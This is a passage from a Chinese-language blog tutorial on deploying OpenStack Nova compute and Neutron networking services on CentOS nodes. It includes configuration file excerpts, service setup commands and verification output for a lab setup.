class="comment">//nova:nova@192.168.57.145/nova</span></span><br><span class="line">[DEFAULT]</span><br><span class="line"># ...</span><br><span class="line">transport_url = rabbit:<span class="comment">//openstack:openstack@192.168.57.145</span></span><br></pre></td></tr></table></figure><h3 id="5-10设置api和连接信息"><a href="#5-10设置api和连接信息" class="headerlink" title="5.10设置api和连接信息"></a><strong>5.10设置api和连接信息</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[api]</span><br><span class="line"># ...</span><br><span class="line">auth_strategy = keystone</span><br><span class="line">[keystone_authtoken]</span><br><span class="line"># ...</span><br><span class="line">auth_uri = http:<span class="comment">//linux-node2:5000</span></span><br><span class="line">auth_url = http:<span class="comment">//linux-node2:35357</span></span><br><span class="line">memcached_servers = linux-node2:<span class="number">11211</span> </span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = <span class="keyword">default</span></span><br><span class="line">user_domain_name = <span class="keyword">default</span></span><br><span class="line">project_name = service</span><br><span class="line">username = nova</span><br><span class="line">password = nova</span><br><span class="line"></span><br><span class="line">设置IP</span><br><span class="line">[DEFAULT]</span><br><span class="line"># ...</span><br><span class="line">my_ip = <span class="number">192.168</span><span class="number">.57</span><span class="number">.145</span></span><br><span class="line">[DEFAULT]</span><br><span class="line"># ...</span><br><span class="line">use_neutron = True</span><br><span class="line">firewall_driver = nova.virt.firewall.NoopFirewallDriver</span><br><span class="line">[vnc]</span><br><span class="line">enabled = <span class="literal">true</span></span><br><span class="line"># ...</span><br><span class="line">vncserver_listen = $my_ip</span><br><span class="line">vncserver_proxyclient_address = $my_ip</span><br></pre></td></tr></table></figure><h3 id="5-11设置glance"><a href="#5-11设置glance" class="headerlink" title="5.11设置glance"></a><strong>5.11设置glance</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[glance]</span><br><span class="line"># ...</span><br><span class="line">api_servers = http:<span class="comment">//linux-node2:9292</span></span><br></pre></td></tr></table></figure><h3 id="5-12设置-oslo-concurrency"><a href="#5-12设置-oslo-concurrency" class="headerlink" title="5.12设置**[oslo_concurrency]**"></a><strong>5.12设置**</strong>[oslo_concurrency]**</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[oslo_concurrency]</span><br><span class="line"># ...</span><br><span class="line">lock_path = <span class="regexp">/var/</span>lib/nova/tmp</span><br></pre></td></tr></table></figure><h3 id="5-13设置-placement"><a href="#5-13设置-placement" class="headerlink" title="5.13设置**[placement]**"></a><strong>5.13设置**</strong>[placement]**</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[placement]</span><br><span class="line"># ...</span><br><span class="line"> os_region_name = RegionOne</span><br><span class="line">project_domain_name = Default</span><br><span class="line">project_name = service</span><br><span class="line">auth_type = password</span><br><span class="line">user_domain_name = Default</span><br><span class="line">auth_url = http:<span class="comment">//linux-node2:35357/v3</span></span><br><span class="line">username = placement</span><br><span class="line">password = nova</span><br></pre></td></tr></table></figure><h3 id="5-14设置apache"><a href="#5-14设置apache" class="headerlink" title="5.14设置apache"></a><strong>5.14设置apache</strong></h3><p>vim  /etc/httpd/conf.d/00-nova-placement-api.conf:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory /usr/bin&gt;</span><br><span class="line">   &lt;IfVersion &gt;= <span class="number">2.4</span>&gt;</span><br><span class="line">      Require all granted</span><br><span class="line">   &lt;<span class="regexp">/IfVersion&gt;</span></span><br><span class="line"><span class="regexp">   &lt;IfVersion &lt; 2.4&gt;</span></span><br><span class="line"><span class="regexp">      Order allow,deny</span></span><br><span class="line"><span class="regexp">      Allow from all</span></span><br><span class="line"><span class="regexp">   &lt;/</span>IfVersion&gt;</span><br><span class="line">&lt;<span class="regexp">/Directory&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-15重启apache"><a href="#5-15重启apache" class="headerlink" title="5.15重启apache"></a><strong>5.15重启apache</strong></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># systemctl restart httpd</span><br></pre></td></tr></table></figure><p>填充nova-api数据库：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># su -s /bin/sh -c "nova-manage api_db sync" nova</span><br></pre></td></tr></table></figure><p>注册cell0数据库：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># su -s /bin/sh -c "nova-manage cell_v2 map_cell0" nova</span><br></pre></td></tr></table></figure><p>创建cell1单元格：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># su -s /bin/sh -c "nova-manage cell_v2 create_cell --name=cell1 --verbose" nova</span><br><span class="line"><span class="number">109e1</span>d4b<span class="number">-536</span>a<span class="number">-40</span>d0<span class="number">-83</span>c6<span class="number">-5</span>f121b82b650</span><br></pre></td></tr></table></figure><p>填充nova数据库：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># su -s /bin/sh -c "nova-manage db sync" nova</span><br></pre></td></tr></table></figure><h3 id="5-17验证"><a href="#5-17验证" class="headerlink" title="5.17验证"></a><strong>5.17验证</strong></h3><p>验证nova cell0和cell1是否正确注册：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">＃ nova-manage cell_v2 list_cells</span><br><span class="line"> + ------- + ----------------------------------- --- + </span><br><span class="line">| 名称| UUID | </span><br><span class="line">+ ------- + -------------------------------------- + </span><br><span class="line">| cell1 | <span class="number">109e1</span>d4b<span class="number">-536</span>a<span class="number">-40</span>d0<span class="number">-83</span>c6<span class="number">-5</span>f121b82b650 | </span><br><span class="line">| cell0 | <span class="number">00000000</span><span class="number">-0000</span><span class="number">-0000</span><span class="number">-0000</span><span class="number">-000000000000</span> | </span><br><span class="line">+ ------- + -------------------------------------- +</span><br><span class="line">设置开机自启动</span><br><span class="line">[root@linux-node2 nova]# systemctl enable openstack-nova-api.service</span><br><span class="line">[root@linux-node2 nova]# systemctl enable openstack-nova-consoleauth.service</span><br><span class="line">[root@linux-node2 nova]# systemctl enable openstack-nova-scheduler.service</span><br><span class="line">[root@linux-node2 nova]# systemctl enable openstack-nova-conductor.service </span><br><span class="line">[root@linux-node2 nova]# systemctl enable openstack-nova-novncproxy.service</span><br><span class="line">[root@linux-node2 nova]#</span><br><span class="line">启动服务</span><br><span class="line">[root@linux-node2 nova]# systemctl start openstack-nova-api.service</span><br><span class="line">[root@linux-node2 nova]# systemctl start openstack-nova-consoleauth.service</span><br><span class="line">[root@linux-node2 nova]# systemctl start openstack-nova-scheduler.service</span><br><span class="line">[root@linux-node2 nova]# systemctl start openstack-nova-conductor.service </span><br><span class="line">[root@linux-node2 nova]# systemctl start openstack-nova-novncproxy.service</span><br></pre></td></tr></table></figure><h2 id="六、计算服务二-nova（node1计算节点操作）"><a href="#六、计算服务二-nova（node1计算节点操作）" class="headerlink" title="六、计算服务二  nova（node1计算节点操作）"></a><strong>六、计算服务二  nova（node1计算节点操作）</strong></h2><h3 id="6-1安装nova-compute"><a href="#6-1安装nova-compute" class="headerlink" title="6.1安装nova-compute"></a><strong>6.1安装nova-compute</strong></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># yum install openstack-nova-compute</span><br></pre></td></tr></table></figure><h3 id="6-2配置主配置文件（-etc-nova-nova-conf-）"><a href="#6-2配置主配置文件（-etc-nova-nova-conf-）" class="headerlink" title="6.2配置主配置文件（**/etc/nova/nova.conf**）"></a><strong>6.2配置主配置文件（**</strong>/etc/nova/nova.conf<strong>**）</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line"># ...</span><br><span class="line">enabled_apis = osapi_compute,metadata</span><br><span class="line">[DEFAULT]</span><br><span class="line"># ...</span><br><span class="line">transport_url = rabbit:<span class="comment">//openstack:openstack@192.168.57.145</span></span><br><span class="line">[api]</span><br><span class="line"># ...</span><br><span class="line">auth_strategy = keystone</span><br><span class="line"></span><br><span class="line">[keystone_authtoken]</span><br><span class="line"># ...</span><br><span class="line">auth_uri = http:<span class="comment">//linux-node2:5000</span></span><br><span class="line">auth_url = http:<span class="comment">//linux-node2:35357</span></span><br><span class="line">memcached_servers = linux-node2:<span class="number">11211</span></span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = <span class="keyword">default</span></span><br><span class="line">user_domain_name = <span class="keyword">default</span></span><br><span class="line">project_name = service</span><br><span class="line">username = nova</span><br><span class="line">password = nova</span><br><span class="line">[DEFAULT]</span><br><span class="line"># ...</span><br><span class="line">my_ip = 192.168.57.142  ########这个是本机IP</span><br><span class="line">[DEFAULT]</span><br><span class="line"># ...</span><br><span class="line">use_neutron = True</span><br><span class="line">firewall_driver = nova.virt.firewall.NoopFirewallDriver</span><br><span class="line">[vnc]</span><br><span class="line"># ...</span><br><span class="line">enabled = True</span><br><span class="line">vncserver_listen = <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">vncserver_proxyclient_address = $my_ip</span><br><span class="line">novncproxy_base_url = http:<span class="comment">//linux-node2:6080/vnc_auto.html</span></span><br><span class="line">[glance]</span><br><span class="line"># ...</span><br><span class="line">api_servers = http:<span class="comment">//linux-node2:9292</span></span><br><span class="line">[oslo_concurrency]</span><br><span class="line"># ...</span><br><span class="line">lock_path = <span class="regexp">/var/</span>lib/nova/tmp</span><br><span class="line">[placement]</span><br><span class="line"># ...</span><br><span class="line">os_region_name = RegionOne</span><br><span class="line">project_domain_name = Default</span><br><span class="line">project_name = service</span><br><span class="line">auth_type = password</span><br><span class="line">user_domain_name = Default</span><br><span class="line">auth_url = http:<span class="comment">//linux-node2:35357/v3</span></span><br><span class="line">username = placement</span><br><span class="line">password = nova</span><br></pre></td></tr></table></figure><h3 id="6-3检查是否需要硬件加速"><a href="#6-3检查是否需要硬件加速" class="headerlink" title="6.3检查是否需要硬件加速"></a><strong>6.3检查是否需要硬件加速</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ egrep -c <span class="string">'(vmx|svm)'</span> /proc/cpuinfo</span><br></pre></td></tr></table></figure><p>如果为0则需要修改#vi /etc/nova/nova.conf</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[libvirt]</span><br><span class="line"># ...</span><br><span class="line">virt_type = qemu</span><br></pre></td></tr></table></figure><h3 id="6-4启动服务"><a href="#6-4启动服务" class="headerlink" title="6.4启动服务"></a><strong>6.4启动服务</strong></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># systemctl enable libvirtd.service openstack-nova-compute.service</span><br><span class="line"># systemctl start libvirtd.service openstack-nova-compute.service</span><br></pre></td></tr></table></figure><h3 id="6-5验证-node2-主节点操作"><a href="#6-5验证-node2-主节点操作" class="headerlink" title="6.5验证(node2 主节点操作)"></a><strong>6.5验证(node2 主节点操作)</strong></h3><p>将计算节点添加到单元数据库<a href="https://www.o2oxy.cn/917.html#add-the-compute-node-to-the-cell-database" target="_blank" rel="noopener"><strong>¶</strong></a>（在主节点操作）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">su -s /bin/sh -c <span class="string">"nova-manage cell_v2 discover_hosts --verbose"</span> nova</span><br><span class="line"></span><br><span class="line">Found <span class="number">2</span> cell mappings.</span><br><span class="line">Skipping cell0 since it does not contain hosts.</span><br><span class="line">Getting compute nodes <span class="keyword">from</span> cell <span class="string">'cell1'</span>: ad5a5985-a719<span class="number">-4567</span><span class="number">-98</span>d8<span class="number">-8</span>d148aaae4bc</span><br><span class="line">Found <span class="number">1</span> computes <span class="keyword">in</span> cell: ad5a5985-a719<span class="number">-4567</span><span class="number">-98</span>d8<span class="number">-8</span>d148aaae4bc</span><br><span class="line">Checking host mapping <span class="keyword">for</span> compute host <span class="string">'linux-node1'</span>: fe58ddc1<span class="number">-1</span>d65<span class="number">-4</span>f87<span class="number">-9456</span>-bc040dc106b3</span><br><span class="line">Creating host mapping <span class="keyword">for</span> compute host <span class="string">'linux-node1'</span>: fe58ddc1<span class="number">-1</span>d65<span class="number">-4</span>f87<span class="number">-9456</span>-bc040dc106b3</span><br></pre></td></tr></table></figure><p>查看comput节点</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">$ openstack compute service list</span><br><span class="line"></span><br><span class="line">+----+--------------------+------------+----------+---------+-------+----------------------------+</span><br><span class="line">| Id | Binary             | Host       | Zone     | Status  | State | Updated At                 |</span><br><span class="line">+----+--------------------+------------+----------+---------+-------+----------------------------+</span><br><span class="line">|  <span class="number">1</span> | nova-consoleauth   | controller | internal | enabled | up    | <span class="number">2016</span><span class="number">-02</span><span class="number">-09</span>T23:<span class="number">11</span>:<span class="number">15.000000</span> |</span><br><span class="line">|  <span class="number">2</span> | nova-scheduler     | controller | internal | enabled | up    | <span class="number">2016</span><span class="number">-02</span><span class="number">-09</span>T23:<span class="number">11</span>:<span class="number">15.000000</span> |</span><br><span class="line">|  <span class="number">3</span> | nova-conductor     | controller | internal | enabled | up    | <span class="number">2016</span><span class="number">-02</span><span class="number">-09</span>T23:<span class="number">11</span>:<span class="number">16.000000</span> |</span><br><span class="line">|  <span class="number">4</span> | nova-compute       | compute1   | nova     | enabled | up    | <span class="number">2016</span><span class="number">-02</span><span class="number">-09</span>T23:<span class="number">11</span>:<span class="number">20.000000</span> |</span><br><span class="line">+----+--------------------+------------+----------+---------+-------+----------------------------+</span><br><span class="line">查看catalog</span><br><span class="line">$ openstack catalog list</span><br><span class="line">+-----------+-----------+-----------------------------------------+</span><br><span class="line">| Name      | Type      | Endpoints                               |</span><br><span class="line">+-----------+-----------+-----------------------------------------+</span><br><span class="line">| keystone  | identity  | RegionOne                               |</span><br><span class="line">|           |           |   public: http:<span class="comment">//linux-node2:5000/v3/    |</span></span><br><span class="line">|           |           | RegionOne                               |</span><br><span class="line">|           |           |   internal: http:<span class="comment">//linux-node2:5000/v3/  |</span></span><br><span class="line">|           |           | RegionOne                               |</span><br><span class="line">|           |           |   admin: http:<span class="comment">//linux-node2:35357/v3/    |</span></span><br><span class="line">|           |           |                                         |</span><br><span class="line">| glance    | image     | RegionOne                               |</span><br><span class="line">|           |           |   admin: http:<span class="comment">//linux-node2:9292         |</span></span><br><span class="line">|           |           | RegionOne                               |</span><br><span class="line">|           |           |   public: http:<span class="comment">//linux-node2:9292        |</span></span><br><span class="line">|           |           | RegionOne                               |</span><br><span class="line">|           |           |   internal: http:<span class="comment">//linux-node2:9292      |</span></span><br><span class="line">|           |           |                                         |</span><br><span class="line">| nova      | compute   | RegionOne                               |</span><br><span class="line">|           |           |   admin: h http:<span class="comment">//linux-node2:8774/v2.1    |</span></span><br><span class="line">|           |           | RegionOne                               |</span><br><span class="line">|           |           |   internal: http:<span class="comment">//linux-node2:8774/v2.1 |</span></span><br><span class="line">|           |           | RegionOne                               |</span><br><span class="line">|           |           |   public: http:<span class="comment">//linux-node2:8774/v2.1   |</span></span><br><span class="line">|           |           |                                         |</span><br><span class="line">| placement | placement | RegionOne                               |</span><br><span class="line">|           |           |   public: http:<span class="comment">//linux-node2:8778        |</span></span><br><span class="line">|           |           | RegionOne                               |</span><br><span class="line">|           |           |   admin: http:<span class="comment">//linux-node2:8778         |</span></span><br><span class="line">|           |           | RegionOne                               |</span><br><span class="line">|           |           |   internal: http:<span class="comment">//linux-node2:8778      |</span></span><br><span class="line">|           |           |                                         |</span><br><span class="line">+-----------+-----------+-----------------------------------------+</span><br></pre></td></tr></table></figure><p>列出Image服务中的图像以验证与Image服务的连接性：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ openstack image list</span><br><span class="line"></span><br><span class="line">+--------------------------------------+-------------+-------------+</span><br><span class="line">| ID                                   | Name        | Status      |</span><br><span class="line">+--------------------------------------+-------------+-------------+</span><br><span class="line">| <span class="number">9</span>a76d9f9<span class="number">-9620</span><span class="number">-4</span>f2e<span class="number">-8</span>c69<span class="number">-6</span>c5691fae163 | cirros      | active      |</span><br><span class="line">+--------------------------------------+-------------+-------------+</span><br></pre></td></tr></table></figure><p>检查单元格和放置API正在成功工作：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># nova-status upgrade check</span><br><span class="line"></span><br><span class="line">+---------------------------+</span><br><span class="line">| Upgrade Check Results     |</span><br><span class="line">+---------------------------+</span><br><span class="line">| Check: Cells v2           |</span><br><span class="line">| Result: Success           |</span><br><span class="line">| Details: None             |</span><br><span class="line">+---------------------------+</span><br><span class="line">| Check: Placement API      |</span><br><span class="line">| Result: Success           |</span><br><span class="line">| Details: None             |</span><br><span class="line">+---------------------------+</span><br><span class="line">| Check: Resource Providers |</span><br><span class="line">| Result: Success           |</span><br><span class="line">| Details: None             |</span><br><span class="line">+---------------------------+</span><br></pre></td></tr></table></figure><h2 id="七、网络节点一（node2-主控制节点操作）"><a href="#七、网络节点一（node2-主控制节点操作）" class="headerlink" title="七、网络节点一（node2 主控制节点操作）"></a><strong>七、网络节点一（node2 主控制节点操作）</strong></h2><h3 id="7-1-设置mysql"><a href="#7-1-设置mysql" class="headerlink" title="7.1 设置mysql"></a><strong>7.1 设置mysql</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -u root –p</span><br><span class="line">MariaDB [（none）] CREATE DATABASE neutron;</span><br><span class="line">MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON neutron.* TO <span class="string">'neutron'</span>@<span class="string">'localhost'</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">'neutron'</span>;</span><br><span class="line">MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON neutron.* TO <span class="string">'neutron'</span>@<span class="string">'%'</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">'neutron'</span>;</span><br></pre></td></tr></table></figure><h3 id="7-2-创建服务凭据"><a href="#7-2-创建服务凭据" class="headerlink" title="7.2**创建服务凭据**"></a><strong>7.2**</strong>创建服务凭据**</h3><p>在admin的环境下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ . admin-openrc</span><br><span class="line">$ openstack user create --domain <span class="keyword">default</span> --password-prompt neutron</span><br><span class="line"></span><br><span class="line">User Password: neutron  #密码</span><br><span class="line">Repeat User Password: neutron  #密码</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| Field               | Value                            |</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| domain_id           | <span class="keyword">default</span>                          |</span><br><span class="line">| enabled             | True                             |</span><br><span class="line">| id                  | fdb0f541e28141719b6a43c8944bf1fb |</span><br><span class="line">| name                | neutron                          |</span><br><span class="line">| options             | &#123;&#125;                               |</span><br><span class="line">| password_expires_at | None                             |</span><br><span class="line">+---------------------+----------------------------------+</span><br></pre></td></tr></table></figure><p>加入到admin组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openstack role add --project service --user neutron admin</span><br></pre></td></tr></table></figure><p>创建neutron 服务实体</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ openstack service create --name neutron \</span><br><span class="line">  --description <span class="string">"OpenStack Networking"</span> network</span><br></pre></td></tr></table></figure><p>创建neutron API</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ openstack endpoint create --region RegionOne \</span><br><span class="line">  network public http:<span class="comment">//linux-node2:9696</span></span><br><span class="line">$ openstack endpoint create --region RegionOne \</span><br><span class="line">  network internal http:<span class="comment">//linux-node2:9696</span></span><br><span class="line">$ openstack endpoint create --region RegionOne \</span><br><span class="line">  network admin http:<span class="comment">//linux-node2:9696</span></span><br></pre></td></tr></table></figure><h3 id="7-3-配置网络选项-（这里我选用的是网络1-的配置）"><a href="#7-3-配置网络选项-（这里我选用的是网络1-的配置）" class="headerlink" title="7.3**配置网络选项**（这里我选用的是网络1 的配置）"></a><strong>7.3**</strong>配置网络选项<strong>**（这里我选用的是网络1 的配置）</strong></h3><p>您可以使用选项1和2所代表的两种体系结构之一来部署网络服务。</p><p>选项1部署了最简单的架构，只支持将实例连接到提供者（外部）网络。没有自助服务（专用）网络，</p><p>路由器或浮动IP地址。只有admin或其他特权用户才能管理提供商网络。</p><p>选项2增加了选项1，其中第三层服务支持将实例附加到自助服务网络。这个demo或其他非特权用户可以管理自助服务网络，</p><p>包括在自助服务和提供商网络之间提供连接的路由器。此外，浮动IP地址还提供与使用来自外部网络（如Internet）的自助服务网络的实例的连接。</p><p>自助服务网络通常使用覆盖网络。覆盖网络协议（如VXLAN）包含额外的标头，这些标头会增加开销并减少有效负载或用户数据的可用空间。</p><p>在不了解虚拟网络基础架构的情况下，实例将尝试使用1500字节的默认以太网<a href="https://www.o2oxy.cn/917.html#term-maximum-transmission-unit-mtu" target="_blank" rel="noopener">最大传输单元（MTU）</a>发送数据包。</p><p>网络服务通过DHCP自动为实例提供正确的MTU值。但是，某些云图像不使用DHCP或忽略DHCP MTU选项并需要使用元数据或脚本进行配置。</p><h3 id="7-4-安装网络openstack-neutron"><a href="#7-4-安装网络openstack-neutron" class="headerlink" title="7.4 安装网络openstack-neutron"></a><strong>7.4 安装网络openstack-neutron</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># yum install openstack-neutron openstack-neutron-ml2 \</span><br><span class="line">  openstack-neutron-linuxbridge ebtables</span><br></pre></td></tr></table></figure><h3 id="7-5-编辑-etc-neutron-neutron-conf"><a href="#7-5-编辑-etc-neutron-neutron-conf" class="headerlink" title="7.5 编辑/etc/neutron/neutron.conf"></a><strong>7.5</strong> <strong>编辑/etc/neutron/neutron.conf</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">[database]</span><br><span class="line"># ...</span><br><span class="line">connection = mysql:<span class="comment">//neutron:neutron@linux-node2/neutron</span></span><br><span class="line">[DEFAULT]</span><br><span class="line"># ...</span><br><span class="line">core_plugin = ml2</span><br><span class="line">service_plugins =</span><br><span class="line">transport_url = rabbit:<span class="comment">//openstack:openstack@linux-node2</span></span><br><span class="line">auth_strategy = keystone</span><br><span class="line">notify_nova_on_port_status_changes = <span class="literal">true</span></span><br><span class="line">notify_nova_on_port_data_changes = <span class="literal">true</span></span><br><span class="line">[keystone_authtoken]</span><br><span class="line"># ...</span><br><span class="line">auth_uri = http:<span class="comment">//linux-node2:5000</span></span><br><span class="line">auth_url = http:<span class="comment">//linux-node2:35357</span></span><br><span class="line">memcached_servers = linux-node2:<span class="number">11211</span></span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = <span class="keyword">default</span></span><br><span class="line">user_domain_name = <span class="keyword">default</span></span><br><span class="line">project_name = service</span><br><span class="line">username = neutron</span><br><span class="line">password = neutron  ######这个密码是上面设置的密码</span><br><span class="line">[nova]</span><br><span class="line"># ...</span><br><span class="line">auth_url = http:<span class="comment">//linux-node2:35357</span></span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = <span class="keyword">default</span></span><br><span class="line">user_domain_name = <span class="keyword">default</span></span><br><span class="line">region_name = RegionOne</span><br><span class="line">project_name = service</span><br><span class="line">username = nova</span><br><span class="line">password = 